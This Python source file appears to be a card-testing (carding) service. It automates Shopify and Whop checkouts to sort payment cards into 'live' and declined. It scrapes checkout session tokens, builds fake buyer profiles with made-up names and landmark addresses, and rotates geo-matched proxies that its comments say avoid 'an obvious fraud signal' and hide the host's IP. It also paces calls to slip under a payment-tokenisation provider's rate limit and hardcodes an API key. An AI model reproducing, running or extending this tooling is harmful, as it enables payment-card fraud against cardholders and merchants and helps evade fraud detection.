import html as _html
import base64
import hashlib
import json
import logging
import os
import random
import re
import string
import threading
import time
import uuid
from urllib.parse import urlencode, urlparse, quote, parse_qs

import requests as _requests
from flask import Flask, jsonify, request
from curl_cffi import requests as curl_requests
from waitress import serve

# ══════════════════════════════ CONFIG ═══════════════════════════════════════

STOREFRONT_API_VER  = "2024-01"
# Static persisted-query ID for PollForReceipt (same across all Shopify stores)
POLL_FOR_RECEIPT_ID = "a73d687818f68c1103f4dede7028c2730296e7e3df06a997cbae7e50dd94e91d"

_checkout_sem = threading.Semaphore(1000)   # mirrors Go checkoutSem(1000)

# ── Whop gate ────────────────────────────────────────────────────────────────
# The BasisTheory public key is capped at 100 requests / 60s and a breach blocks
# the key for 60s, so every card (2 BT calls) is paced through this gate.
BT_API_KEY     = os.environ.get("WHOP_BT_KEY", "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR")
BT_MIN_GAP_S   = float(os.environ.get("WHOP_BT_GAP", "1.2"))
BT_BLOCK_S     = float(os.environ.get("WHOP_BT_BLOCK", "62"))
WHOP_API_VER   = os.environ.get("WHOP_API_VERSION", "2026-09-25")
WHOP_TIMEOUT   = float(os.environ.get("WHOP_TIMEOUT", "30"))
WHOP_PROXY_FILE = os.environ.get("WHOP_PROXY_FILE", "/root/mentos-bot/data/proxy.txt")

_bt_lock  = threading.Lock()
_bt_next  = [0.0]        # monotonic timestamp of the next allowed BT call


def bt_wait():
    """Block until the next BasisTheory call is allowed (keeps us under 100/60s)."""
    while True:
        with _bt_lock:
            now = time.monotonic()
            if now >= _bt_next[0]:
                _bt_next[0] = now + BT_MIN_GAP_S
                return
            sleep_for = _bt_next[0] - now
        time.sleep(sleep_for)


def bt_penalise():
    """A 429 blocks the key for ~60s; push every queued call out past it."""
    with _bt_lock:
        _bt_next[0] = max(_bt_next[0], time.monotonic() + BT_BLOCK_S)


def whop_pick_proxy(country=""):
    """Pick a proxy for the card's country. Raises when the pool is empty.

    Pool lines may optionally be tagged with the ISO-2 country they exit from:

        PH|user:pass@host:port     <- preferred for a Philippine card
        user:pass@host:port        <- untagged, usable by any card

    A geo-matched exit matters: a Philippine card arriving from a US IP with a
    US-shaped session is an obvious fraud signal. When no tagged proxy exists
    for the country we still use an untagged one, because never using a proxy is
    worse (it leaks this host's IP and is trivially fingerprinted).
    """
    try:
        with open(WHOP_PROXY_FILE, "r", encoding="utf-8", errors="ignore") as fh:
            lines = [ln.strip() for ln in fh if ln.strip() and not ln.strip().startswith("#")]
    except OSError as e:
        raise RuntimeError(f"proxy pool unreadable: {e}")
    if not lines:
        raise RuntimeError("proxy pool is empty")

    cu = (country or "").upper()[:2]
    tagged, plain = [], []
    for ln in lines:
        if len(ln) > 3 and ln[2] == "|" and ln[:2].isalpha():
            tagged.append(ln[3:])
        else:
            plain.append(ln)

    for pool in (([p for p in tagged] if cu else []), plain, tagged):
        if not pool:
            continue
        shuffled = list(pool)
        random.shuffle(shuffled)
        for raw in shuffled[:8]:
            try:
                return normalize_proxy(raw)
            except ValueError:
                continue
    raise RuntimeError("no usable proxy in pool")

# Production params
HUENCY_THREADS  = int(os.environ.get("HUENCY_THREADS", "200"))   # waitress worker threads
HUENCY_CHANNELS = int(os.environ.get("HUENCY_CHANNELS", "1000")) # keep-alive conns accepted
CHECKOUT_DEADLINE_S = float(os.environ.get("HUENCY_DEADLINE", "45"))  # wall-clock cap per call
# Step 0 is pure transport work (products.json / collections / sitemap). A dead
# exit IP or a blip there says nothing about the site or the card, so it is
# retried on a rebuilt session — and on a different pool proxy, since the same
# dead proxy fails identically no matter how often we ask it.
STEP0_MAX_ATTEMPTS = max(1, int(os.environ.get("HUENCY_STEP0_RETRIES", "3")))
STEP0_BACKOFF_S    = float(os.environ.get("HUENCY_STEP0_BACKOFF", "0.6"))

_tl = threading.local()          # per-request deadline
def _set_deadline(seconds: float) -> float:
    _tl.deadline = time.monotonic() + seconds
    return _tl.deadline
def _over() -> bool:
    return time.monotonic() > getattr(_tl, "deadline", float("inf"))

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("shopii")
app = Flask(__name__)

# Site/order-level config errors, NOT card decisions. Each hit is retried with a
# fresh site so a single misconfigured shop never turns a live card into a death.
_SITE_CONFIG_CODES = frozenset((
    "UNACCEPTABLE_PAYMENT_AMOUNT",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT",
    "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
    "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
    "VALIDATION_CUSTOM",
    "GENERIC_ERROR",
    "INVALID_PURCHASE_TYPE",
    "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
    "AMOUNT_TOO_SMALL",
    "MERCHANDISE_OUT_OF_STOCK",
    "DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED",
    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
    "DELIVERY_NONE_AVAILABLE",
    "DELIVERY_NO_STRATEGIES_AVAILABLE",
    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
    "DELIVERY_SELECTED_OPTION_NOT_AVAILABLE",
    "DELIVERY_LINE_NOT_FOUND",
    "TAX_TAX_INCLUSIVITY_MISMATCH",
    "TAX_NEW_TAX_MUST_BE_ACCEPTED",
    "AUTH_GATED_CHECKOUT",
    "STORE_NOT_ACCEPTING_ORDERS",
    "CARD_CHALLENGE",
    # Store doesn't serve the profile's shipping country — site config,
    # not a card decision: rotate to another store.
    "PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY",
))

# Transient gateway codes that are NOT approvals. They are retried (the same
# card on another attempt / fresh session can succeed), but the final outcome
# stays a decline. Note PROCESSING_ERROR must never be read as an approval just
# because it contains the substring "PROCESSING".
_RETRY_DECLINE_CODES = frozenset((
    "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE",
    "PROCESSING_ERROR",
))

# Submit rejections that mean our snapshot of the plan drifted from the live one
# (delivery re-rating, stale handle, mismatched presentment). One fresh Proposal
# re-syncs queue/delivery/totals, then we resubmit instead of failing the site.
_RECOVERABLE_VIOLATION_RE = re.compile(
    r'"code"\s*:\s*"(?:DELIVERY_[A-Z_]+|BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH|INVALID_PAYMENT_METHOD|WAITING_PENDING_TERMS|TAX_[A-Z_]+)"'
)

def ext_embedded_handle(body: str) -> str:
    # On a SubmitRejected reply the rails recompute the accepted plan and embed
    # it as submitForCompletion.sellerProposal (or buyerProposal) — the corrected
    # delivery handle for a ConfirmChangeViolation is the first non-empty strategy.
    try:
        mobj = json.loads(body)
        sub = mobj.get("data", {}).get("submitForCompletion") or mobj.get("data", {}).get("proposal") or mobj.get("submitForCompletion") or mobj.get("proposal") or {}
        for prop_key in ("sellerProposal", "buyerProposal", "proposal"):
            prop = sub.get(prop_key) or {}
            deliv = prop.get("delivery") or {}
            for ln in deliv.get("deliveryLines") or []:
                strat = ln.get("selectedDeliveryStrategy") or {}
                h = strat.get("handle") or (strat.get("deliveryStrategyByHandle") or {}).get("handle") or ""
                if h and h != "shop_promise":
                    return str(h)
                for avail in ln.get("availableDeliveryStrategies") or []:
                    h = avail.get("handle") or (avail.get("deliveryStrategyByHandle") or {}).get("handle") or ""
                    if h and h != "shop_promise":
                        return str(h)
                for strat in ln.get("deliveryStrategies") or []:
                    h = strat.get("handle") or ""
                    if h and h != "shop_promise":
                        return str(h)
            deliv_exp = prop.get("deliveryExpectations") or {}
            for de in deliv_exp.get("deliveryExpectations") or []:
                dh = de.get("deliveryStrategyHandle")
                if dh and dh != "shop_promise":
                    return str(dh)
            for macro in deliv.get("deliveryMacros") or []:
                for mh in macro.get("deliveryStrategyHandles") or []:
                    if mh and mh != "shop_promise":
                        return str(mh)
    except Exception:
        pass
    return ""

_IS_SHIPPING_REQ_RE = re.compile(r'"isShippingRequired"\s*:\s*(false|true)', re.IGNORECASE)

def ext_is_shipping_required(body: str, default: bool = True) -> bool:
    try:
        data = json.loads(body) if isinstance(body, str) else body
        if isinstance(data, dict):
            for root in (data.get("data", {}), data):
                for ck in ("negotiation", "submitForCompletion", "proposal", "session"):
                    cont = root.get(ck) or {}
                    res = cont.get("result") if isinstance(cont, dict) and "result" in cont else cont
                    if isinstance(res, dict) and "negotiate" in res:
                        res = res["negotiate"].get("result") or res["negotiate"]
                    for pkey in ("sellerProposal", "buyerProposal", "proposal"):
                        prop = (res.get(pkey) if isinstance(res, dict) else {}) or {}
                        if "isShippingRequired" in prop:
                            return bool(prop["isShippingRequired"])
    except Exception:
        pass
    m = _IS_SHIPPING_REQ_RE.search(body)
    if m:
        return m.group(1).lower() == "true"
    return default

def _plan_from_submit(body: str):
    out = {
        "queue":   ext_queue_token(body),
        "handle":  ext_embedded_handle(body) or ext_delivery_handle(body),
        "signed":  ext_signed_handles(body),
        "shipping": ext_shipping_amount(body),
        "total":   ext_checkout_total(body) or ext_running_total(body),
        "flex":    ext_payment_flex_terms_id(body),
        "pmethod": ext_payment_method_id(body),
        "country": ext_seller_country(body),
        "currency": ext_seller_currency(body),
        "tax_amt": ext_seller_tax_amt(body),
        "tax_incl": ext_seller_tax_included_amt(body),
        "requires_shipping": ext_is_shipping_required(body, default=None),
    }
    return out if any(out.values()) else None

def luhn_valid(number: str) -> bool:
    """Return True if the card number passes the Luhn checksum."""
    digits = [int(c) for c in str(number) if c.isdigit()]
    if len(digits) < 12:
        return False
    checksum, parity = 0, len(digits) % 2
    for i, d in enumerate(digits):
        if i % 2 == parity:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0

# ══════════════════════════════ CURRENCY MAP ══════════════════════════════════

CURRENCY_TO_COUNTRY = {
    "USD":"US","CAD":"CA","GBP":"GB","EUR":"DE","AUD":"AU","NZD":"NZ",
    "SGD":"SG","HKD":"HK","JPY":"JP","CNY":"CN","INR":"IN","MXN":"MX",
    "BRL":"BR","ARS":"AR","CLP":"CL","COP":"CO","PEN":"PE","VND":"VN",
    "THB":"TH","IDR":"ID","PHP":"PH","MYR":"MY","TWD":"TW","KRW":"KR",
    "PKR":"PK","BDT":"BD","LKR":"LK","NPR":"NP","MMK":"MM","KHR":"KH",
    "LAK":"LA","MNT":"MN","AFN":"AF","IRR":"IR","IQD":"IQ","SYP":"SY",
    "LBP":"LB","JOD":"JO","SAR":"SA","AED":"AE","QAR":"QA","KWD":"KW",
    "BHD":"BH","OMR":"OM","YER":"YE","EGP":"EG","SDG":"SD","ETB":"ET",
    "KES":"KE","UGX":"UG","TZS":"TZ","RWF":"RW","ZMW":"ZM","ZWL":"ZW",
    "MZN":"MZ","NAD":"NA","ZAR":"ZA","BWP":"BW","SZL":"SZ","LSL":"LS",
    "MGA":"MG","SCR":"SC","MUR":"MU","MVR":"MV","SEK":"SE","NOK":"NO",
    "DKK":"DK","ISK":"IS","CHF":"CH","CZK":"CZ","PLN":"PL","HUF":"HU",
    "RON":"RO","BGN":"BG","HRK":"HR","RSD":"RS","BAM":"BA","MKD":"MK",
    "ALL":"AL","AMD":"AM","AZN":"AZ","GEL":"GE","KZT":"KZ","KGS":"KG",
    "TJS":"TJ","TMT":"TM","UZS":"UZ","BYN":"BY","UAH":"UA","MDL":"MD",
    "RUB":"RU","TRY":"TR","ILS":"IL","DZD":"DZ","MAD":"MA","TND":"TN",
    "LYD":"LY","GMD":"GM","GNF":"GN","SLL":"SL","LRD":"LR","GHS":"GH",
    "NGN":"NG","XOF":"SN","XAF":"CM","CDF":"CD","AOA":"AO","NIO":"NI",
    "HNL":"HN","GTQ":"GT","BZD":"BZ","TTD":"TT","JMD":"JM","HTG":"HT",
    "BBD":"BB","XCD":"AG","BSD":"BS","KYD":"KY","BMD":"BM","AWG":"AW",
    "BOB":"BO","UYU":"UY","PYG":"PY","GYD":"GY","SRD":"SR","FJD":"FJ",
    "PGK":"PG","SBD":"SB","TOP":"TO","WST":"WS","VUV":"VU","KPW":"KP",
    "MOP":"MO","BND":"BN","KID":"KI","STN":"ST","CVE":"CV","MRU":"MR",
    "SOS":"SO","DJF":"DJ","ERN":"ER","KMF":"KM","BIF":"BI","MWK":"MW",
}

# ══════════════════════════════ COUNTRY ADDRESSES ════════════════════════════

COUNTRY_ADDRESSES = {
    "US": dict(first_name="james",last_name="anderson",address1="428 Madison Ave",address2="Apt 4",city="New York",country_code="US",zone_code="NY",postal_code="10017",phone="+12125550100"),
    "CA": dict(first_name="james",last_name="anderson",address1="200 Kent St",address2="",city="Ottawa",country_code="CA",zone_code="ON",postal_code="K1A 0G9",phone="+16135550100"),
    "GB": dict(first_name="james",last_name="anderson",address1="10 Downing St",address2="",city="London",country_code="GB",zone_code="ENG",postal_code="SW1A 2AA",phone="+442012345678"),
    "AU": dict(first_name="james",last_name="anderson",address1="1 George St",address2="",city="Sydney",country_code="AU",zone_code="NSW",postal_code="2000",phone="+61212345678"),
    "DE": dict(first_name="james",last_name="anderson",address1="Friedrichstr 100",address2="",city="Berlin",country_code="DE",zone_code="BE",postal_code="10117",phone="+493012345678"),
    "FR": dict(first_name="james",last_name="anderson",address1="10 Rue de Rivoli",address2="",city="Paris",country_code="FR",zone_code="IDF",postal_code="75001",phone="+33112345678"),
    "NZ": dict(first_name="james",last_name="anderson",address1="1 Queen St",address2="",city="Auckland",country_code="NZ",zone_code="AUK",postal_code="1010",phone="+6491234567"),
    "IE": dict(first_name="james",last_name="anderson",address1="1 Grafton St",address2="",city="Dublin",country_code="IE",zone_code="D",postal_code="D02 Y006",phone="+35311234567"),
    "SG": dict(first_name="james",last_name="anderson",address1="1 Raffles Quay",address2="",city="Singapore",country_code="SG",zone_code="",postal_code="048583",phone="+6561234567"),
    "HK": dict(first_name="james",last_name="anderson",address1="1 Harbour Rd",address2="",city="Hong Kong",country_code="HK",zone_code="",postal_code="",phone="+85221234567"),
    "JP": dict(first_name="james",last_name="anderson",address1="1-1 Marunouchi",address2="",city="Tokyo",country_code="JP",zone_code="13",postal_code="100-0005",phone="+81312345678"),
    "IN": dict(first_name="james",last_name="anderson",address1="1 MG Road",address2="",city="Bangalore",country_code="IN",zone_code="KA",postal_code="560001",phone="+918012345678"),
    "MX": dict(first_name="james",last_name="anderson",address1="Paseo de la Reforma 1",address2="",city="Mexico City",country_code="MX",zone_code="CMX",postal_code="06600",phone="+5215512345678"),
    "BR": dict(first_name="james",last_name="anderson",address1="Av Paulista 1000",address2="",city="Sao Paulo",country_code="BR",zone_code="SP",postal_code="01310-100",phone="+551112345678"),
    "SE": dict(first_name="james",last_name="anderson",address1="Kungsgatan 1",address2="",city="Stockholm",country_code="SE",zone_code="",postal_code="111 43",phone="+46812345678"),
    "NO": dict(first_name="james",last_name="anderson",address1="Karl Johans Gate 1",address2="",city="Oslo",country_code="NO",zone_code="",postal_code="0154",phone="+4712345678"),
    "DK": dict(first_name="james",last_name="anderson",address1="Stroget 1",address2="",city="Copenhagen",country_code="DK",zone_code="",postal_code="1000",phone="+4512345678"),
    "CH": dict(first_name="james",last_name="anderson",address1="Bahnhofstrasse 1",address2="",city="Zurich",country_code="CH",zone_code="ZH",postal_code="8001",phone="+41442345678"),
    "NL": dict(first_name="james",last_name="anderson",address1="Damrak 1",address2="",city="Amsterdam",country_code="NL",zone_code="",postal_code="1012 LG",phone="+31201234567"),
    "ZA": dict(first_name="james",last_name="anderson",address1="1 Long St",address2="",city="Cape Town",country_code="ZA",zone_code="WC",postal_code="8001",phone="+27211234567"),
    "AE": dict(first_name="james",last_name="anderson",address1="Sheikh Zayed Rd",address2="",city="Dubai",country_code="AE",zone_code="DU",postal_code="00000",phone="+97141234567"),
    "SA": dict(first_name="james",last_name="anderson",address1="King Fahd Rd",address2="",city="Riyadh",country_code="SA",zone_code="01",postal_code="11564",phone="+966112345678"),
    "IL": dict(first_name="james",last_name="anderson",address1="Rothschild Blvd 1",address2="",city="Tel Aviv",country_code="IL",zone_code="TA",postal_code="6688101",phone="+97236123456"),
    "TR": dict(first_name="james",last_name="anderson",address1="Istiklal Caddesi 1",address2="",city="Istanbul",country_code="TR",zone_code="34",postal_code="34433",phone="+902121234567"),
    "PL": dict(first_name="james",last_name="anderson",address1="ul Nowy Swiat 1",address2="",city="Warsaw",country_code="PL",zone_code="",postal_code="00-001",phone="+48221234567"),
    "CZ": dict(first_name="james",last_name="anderson",address1="Vaclavske Namesti 1",address2="",city="Prague",country_code="CZ",zone_code="",postal_code="110 00",phone="+420212345678"),
    "HU": dict(first_name="james",last_name="anderson",address1="Andrassy Ut 1",address2="",city="Budapest",country_code="HU",zone_code="",postal_code="1062",phone="+3612345678"),
    "RO": dict(first_name="james",last_name="anderson",address1="Calea Victoriei 1",address2="",city="Bucharest",country_code="RO",zone_code="B",postal_code="010063",phone="+40212345678"),
    "MY": dict(first_name="james",last_name="anderson",address1="Jalan Bukit Bintang 1",address2="",city="Kuala Lumpur",country_code="MY",zone_code="14",postal_code="55100",phone="+60312345678"),
    "PH": dict(first_name="james",last_name="anderson",address1="Ayala Ave 1",address2="",city="Makati",country_code="PH",zone_code="00",postal_code="1226",phone="+63212345678"),
    "TH": dict(first_name="james",last_name="anderson",address1="Silom Rd 1",address2="",city="Bangkok",country_code="TH",zone_code="10",postal_code="10500",phone="+6622345678"),
    "ID": dict(first_name="james",last_name="anderson",address1="Jl Sudirman 1",address2="",city="Jakarta",country_code="ID",zone_code="JK",postal_code="10220",phone="+62212345678"),
}

_FIRST_NAMES = ["James","Michael","Robert","David","William","John","Alex","Sam","Chris","Ryan",
                "Daniel","Matthew","Anthony","Mark","Donald","Steven","Paul","Andrew","Joshua","Kevin"]
_LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
                "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin"]
_EMAIL_DOMS  = ["gmail.com", "yahoo.com", "outlook.com", "icloud.com", "hotmail.com"]

_RANDOM_US_ADDRESSES = [
    {"address1": "428 Madison Ave", "address2": "Apt 4", "city": "New York", "zone_code": "NY", "postal_code": "10017"},
    {"address1": "123 Main St", "address2": "", "city": "New York", "zone_code": "NY", "postal_code": "10001"},
    {"address1": "4827 Maple Ave", "address2": "", "city": "Chicago", "zone_code": "IL", "postal_code": "60622"},
    {"address1": "9180 Oakwood Blvd", "address2": "", "city": "Austin", "zone_code": "TX", "postal_code": "78704"},
    {"address1": "2217 Jefferson Dr", "address2": "", "city": "Los Angeles", "zone_code": "CA", "postal_code": "90014"},
    {"address1": "834 Pell St", "address2": "", "city": "Boston", "zone_code": "MA", "postal_code": "02111"},
    {"address1": "1560 Rosewood Ln", "address2": "", "city": "Seattle", "zone_code": "WA", "postal_code": "98109"},
    {"address1": "6124 Peachtree Ct", "address2": "", "city": "Atlanta", "zone_code": "GA", "postal_code": "30309"},
    {"address1": "770 N Las Vegas Blvd", "address2": "", "city": "Las Vegas", "zone_code": "NV", "postal_code": "89101"},
    {"address1": "3390 Greenway Dr", "address2": "", "city": "Miami", "zone_code": "FL", "postal_code": "33130"},
    {"address1": "5400 Briarcliff Rd", "address2": "", "city": "Denver", "zone_code": "CO", "postal_code": "80202"},
]

def generate_profile(country: str = "US") -> tuple:
    fn = random.choice(_FIRST_NAMES)
    ln = random.choice(_LAST_NAMES)
    num = random.randint(10, 9999)
    dom = random.choice(_EMAIL_DOMS)
    sep = random.choice([".", "", "_"])
    email = f"{fn.lower()}{sep}{ln.lower()}{num}@{dom}"

    base_addr = COUNTRY_ADDRESSES.get(country, COUNTRY_ADDRESSES["US"]).copy()
    base_addr["first_name"] = fn.lower()
    base_addr["last_name"] = ln.lower()
    if country == "US":
        pick = random.choice(_RANDOM_US_ADDRESSES)
        base_addr["address1"] = pick["address1"]
        base_addr["address2"] = pick["address2"]
        base_addr["city"] = pick["city"]
        base_addr["zone_code"] = pick["zone_code"]
        base_addr["postal_code"] = pick["postal_code"]
        base_addr["phone"] = f"+1{random.randint(201, 989)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    elif country == "CA":
        base_addr["phone"] = f"+1{random.randint(416, 613)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    elif country == "GB":
        base_addr["phone"] = f"+447{random.randint(100000000, 999999999)}"
    return email, base_addr

def address_for_country(country: str, first_name: str = "", last_name: str = "") -> dict:
    base = COUNTRY_ADDRESSES.get(country, COUNTRY_ADDRESSES["US"]).copy()
    if first_name:
        base["first_name"] = first_name
    if last_name:
        base["last_name"] = last_name
    return base

# ══════════════════════════════ PRE-COMPILED REGEXES ════════════════════════════

_UA        = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
_SEC_CH_UA = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'

_STOREFRONT_TOKEN_RES = [
    re.compile(r'"accessToken"\s*:\s*"([0-9a-f]{32})"'),
    re.compile(r'"storefrontAccessToken"\s*:\s*"([0-9a-f]{32})"'),
    re.compile(r'Shopify\.AccessToken\s*=\s*["\']([0-9a-f]{32})["\']'),
    re.compile(r'window\.shopifyStorefrontToken\s*=\s*["\']([0-9a-f]{32})["\']'),
    re.compile(r'"apiKey"\s*:\s*"([0-9a-f]{32})"'),
]
_CHECKOUT_TOKEN_RE  = re.compile(r'/checkouts/cn/([^/?]+)')
_SESSION_TOKEN_RES = [
    re.compile(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"'),
    re.compile(r'<meta\s+name="serialized-session-token"\s+content="([^"]*)"'),
    re.compile(r'<meta\s+name="sessionToken"\s+content="([^"]*)"'),
    re.compile(r'"sessionToken"\s*:\s*"([^"]{20,})"'),
    re.compile(r"'sessionToken'\s*:\s*'([^']{20,})'"),
    re.compile(r'window\.Shopify\.Checkout\.sessionToken\s*=\s*["\']([^"\']+)["\']'),
]
_PAT_ID_RE          = re.compile(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"')
_STABLE_ID_RE       = re.compile(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"')
_COMMIT_SHA_RE      = re.compile(r'"commitSha"\s*:\s*"([a-f0-9]{40})"')
_SOURCE_TOKEN_RES = [
    re.compile(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"'),
    re.compile(r'<meta\s+name="serialized-source-token"\s+content="([^"]*)"'),
    re.compile(r'<meta\s+name="sourceToken"\s+content="([^"]*)"'),
    re.compile(r'"sourceToken"\s*:\s*"([^"]{20,})"'),
    re.compile(r'window\.Shopify\.Checkout\.sourceToken\s*=\s*["\']([^"\']+)["\']'),
]
_IDENT_SIG_RE       = re.compile(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"')
_QUEUE_TOKEN_RE     = re.compile(r'"queueToken"\s*:\s*"([^"]+)"')
_RECEIPT_ID_RE      = re.compile(r'"id"\s*:\s*"(gid://shopify/[A-Za-z]*Receipt/[0-9a-zA-Z]+)"')
_RECEIPT_SESS_RE    = re.compile(r'(?:"receiptSessionToken"|"sessionToken")\s*:\s*"([^"]{8,})"')
_POLL_DELAY_RE      = re.compile(r'"pollDelay"\s*:\s*(\d+)')
_ERROR_CODE_RE      = re.compile(r'"code"\s*:\s*"([^"]+)"')
_PAY_ERR_CODE_RE    = re.compile(r'"(?:paymentError|errorInformation|processingError)"\s*:\s*\{[^{}]*?"code"\s*:\s*"([^"]+)"', re.DOTALL)
_PROP_ERROR_RE      = re.compile(r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"')
_TYPENAME_RE        = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
_PCI_SESSION_ID_RE  = re.compile(r'"id"\s*:\s*"([A-Za-z0-9_\-]+)"')
_DELIVERY_STRAT_HANDLE_RE = re.compile(r'"deliveryStrategyHandle"\s*:\s*"([^"]+)"')
_DELIVERY_RE           = re.compile(r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*?"handle"\s*:\s*"([^"]+)"', re.DOTALL)
_DELIVERY_BY_HANDLE_RE = re.compile(r'"deliveryStrategyByHandle"\s*:\s*\{[^{}]*?"handle"\s*:\s*"([^"]+)"', re.DOTALL)
_DELIVERY_AVAIL_RE     = re.compile(r'"availableDeliveryStrategies"\s*:\s*\[[^\]]*?"handle"\s*:\s*"([^"]+)"', re.DOTALL)
_DELIVERY_HANDLE_RE    = re.compile(r'"deliveryHandle"\s*:\s*"([^"]+)"')
_DELIVERY_FB_RE        = re.compile(r'"handle"\s*:\s*"(shopify-[^"]+)"')
_DELIVERY_HASH_RE      = re.compile(r'"handle"\s*:\s*"([0-9a-f]{32}-[0-9a-f]{32})"')
_SIGNED_HANDLE_RE   = re.compile(r'"signedHandle"\s*:\s*"([^"]+)"')
_SHIPPING_AMT_RE    = re.compile(r'"deliveryStrategyBreakdown"\s*:\s*\[[^\]]*?"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', re.DOTALL)
_CHECKOUT_TOTAL_RE  = re.compile(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
_SELLER_TOTAL_RE    = re.compile(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
_RUNNING_TOTAL_RE   = re.compile(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
_SELLER_TAX_AMT_RE  = re.compile(r'"totalTaxAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
_SELLER_TAX_INCL_RE = re.compile(r'"totalAmountIncludedInTarget"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
_SELLER_CUR_RE      = re.compile(r'"supportedCurrencies"\s*:\s*\["([^"]+)"')
_SELLER_CTR_RE      = re.compile(r'"supportedCountries"\s*:\s*\["([^"]+)"')
_PMI_RE             = re.compile(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"')
_PAY_FLEX_TERMS_RE  = re.compile(r'"paymentFlexibilityPaymentTermsTemplate"\s*:\s*\{\s*"id"\s*:\s*"([^"]+)"')
_PMI2_RE            = re.compile(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"')
_PMI3_RE            = re.compile(r'"directPaymentMethod"\s*:\s*\{[^{}]*?"paymentMethodIdentifier"\s*:\s*"([^"]+)"', re.DOTALL)
_MERCH_PRICE_RE     = re.compile(r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', re.DOTALL)
_ACTIONS_JS_RE      = re.compile(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)')
_ALL_JS_RE          = re.compile(r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]+\.js)')
_SKIP_JS_RE         = re.compile(r'(?i)(locale-|polyfills|libphonenumber|qrcodegen|getCountryCallingCode|/css/|FullScreenBackground|component-[A-Z])')
_PROC_JS_PATS = [
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/c1/useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)'),
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)'),
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/c1/page-Processing[A-Za-z0-9_.-]*\.js)'),
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/c1/page-ThankYou[A-Za-z0-9_.-]*\.js)'),
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Pp]rocessing[A-Za-z0-9_.-]*\.js)'),
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Rr]eceipt[A-Za-z0-9_.-]*\.js)'),
]
_PROPOSAL_ID_RE = re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"')
_SUBMIT_ID_RE   = re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"')
_POLL_ID_PATS = [
    re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"'),
    re.compile(r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"'),
    re.compile(r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"', re.DOTALL),
    re.compile(r'id:\s*"([a-f0-9]{64})"[^}]{0,200}"PollForReceipt"', re.DOTALL),
    re.compile(r'PollForReceipt.{0,300}?([a-f0-9]{64})', re.DOTALL),
    re.compile(r'([a-f0-9]{64}).{0,300}?PollForReceipt', re.DOTALL),
]
_PATCH_CUR_RE  = re.compile(r'"currencyCode"\s*:\s*"[A-Z]{3}"')
_PATCH_PRES_RE = re.compile(r'"presentmentCurrency"\s*:\s*"[A-Z]{3}"')
